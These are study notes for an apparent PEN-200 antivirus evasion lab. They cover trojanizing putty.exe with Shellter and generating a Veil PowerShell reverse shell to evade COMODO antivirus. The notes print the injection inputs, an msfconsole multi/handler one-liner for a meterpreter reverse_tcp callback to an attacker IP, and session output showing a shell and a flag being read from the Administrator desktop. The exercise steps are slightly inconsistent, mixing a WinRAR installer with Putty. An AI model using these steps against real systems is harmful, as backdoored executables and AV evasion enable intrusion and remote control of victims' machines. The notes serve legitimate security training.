---
title: PEN-200 Antivirus Evasion Lab
aliases: []
tags:
- topic/offsec
- topic/antivirus-evasion
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: lab.md
related_tools:
- '[[Shellter]]'
- '[[Veil framework]]'
- '[[Putty]]'
- '[[msfconsole]]'
- '[[COMODO antivirus]]'
- '[[metasploit]]'
related_techniques:
- '[[t1059]]'
- '[[t1555]]'
related_tactics:
- '[[t1003]]'
- '[[t1089]]'
related_services:
- '[[ftp]]'
related_os:
- '[[c-users-administrator-desktop]]'
- '[[~/.wine]]'
- '[[~/.wine.old]]'
- '[[/home/kali/Documents/git/bravo/offsec/pen200/17-AntivirusEvasion/portaputty.exe]]'
- '[[C:\WINDOWS\system32]]'
- '[[flag-txt]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# PEN-200 Antivirus Evasion Lab

## Overview
This section covers exercises for evading antivirus detection on Windows systems. The exercises involve injecting malicious code into executables and batch files using tools like Shellter and Veil framework. The target antivirus is COMODO v12.2.2.8012, and the exercises are performed on VMs with an anonymous FTP server.

## Exercise 1: Injecting Malicious Code into WinRAR Executable
1. Install and update Wine to support 32-bit applications.
2. Download Putty.exe from the provided URL.
3. Use Shellter to inject a meterpreter reverse shell payload into the Putty executable.
4. Transfer the modified Putty executable to the Windows client and run the WinRAR installer to migrate the shell.
5. Verify the injection and run the payload using Metasploit.

## Exercise 2: Injecting Malicious Code into Batch Files
1. Install Veil framework and configure it.
2. Use Veil to generate a PowerShell script for a reverse shell payload.
3. Transfer the generated script to the FTP server and wait for it to be executed by the victim user.
4. Monitor the execution and establish a reverse shell if the script is not detected by the antivirus.

## Command Examples
```bash
# Install and update Wine
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32

# Move Wine directory if necessary
mv ~/.wine ~/.wine.old

# Download Putty
wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe

# Use Shellter to inject payload
shellter
operation mode = A
/home/kali/Documents/git/bravo/offsec/pen200/17-AntivirusEvasion/portaputty.exe
enable stealth mode = Y
1 meterpreter_reverse_tcp
192.168.119.125
4444
Injection: verified

# Run Metasploit
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.119.125; set lport 4444; exploit"

# Use Veil to generate PowerShell script
/usr/share/veil/config/setup.sh --force --silent
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.119.125; set lport 4444; exploit"
```

## Tool Usage
```text
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\n              ||--|| *

       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command
Metasploit Documentation: https://docs.metasploit.com/
```

## Session
```text
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
lhost => 192.168.119.125
lport => 4444
[*] Started reverse TCP handler on 192.168.119.125:4444 
[*] Sending stage (175686 bytes) to 192.168.125.53
[*] Meterpreter session 1 opened (192.168.119.125:4444 -> 192.168.125.53:59996) at 2023-03-07 15:35:05 +1000
```

## Command Execution
```text
meterpreter > shell
Process 6576 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>cd c:\Users\Administrator\Desktop
```
```text
cd c:\Users\Administrator\Desktop
```
```text
c:\Users\Administrator\Desktop>type flag.txt
```
```text
type flag.txt
OS{25ed67eb6efef35bf749a6f9364d2769}
```
```text
c:\Users\Administrator\Desktop>
```

